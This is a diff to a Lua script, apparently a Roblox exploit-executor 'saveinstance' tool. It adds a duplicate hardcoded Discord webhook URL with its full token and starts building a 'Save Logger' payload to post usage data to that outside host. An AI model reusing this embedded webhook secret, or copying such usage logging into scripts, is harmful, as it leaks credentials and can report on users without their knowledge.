@@ -3055,6 +3055,8 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 
 		local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1375480936480899277/QaYMOUIB7mBghiVZH_jh8EiM8kP7Bktt84aHgwFhetGuKee74UK3EzRxhixyGBhVftST"
 
+		local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1375480936480899277/QaYMOUIB7mBghiVZH_jh8EiM8kP7Bktt84aHgwFhetGuKee74UK3EzRxhixyGBhVftST"
+
 		if StatusText then
 			task.spawn(function()
 				elapse_t = os.clock() - elapse_t
@@ -3062,9 +3064,8 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 				local ExtraTime = 10
 				if ok then
 					local request = (syn and syn.request) or http_request or request or fluxus.request
-	
+
 					if request then
-						
 						local data = [[
 {
   "username": "Save Logger",
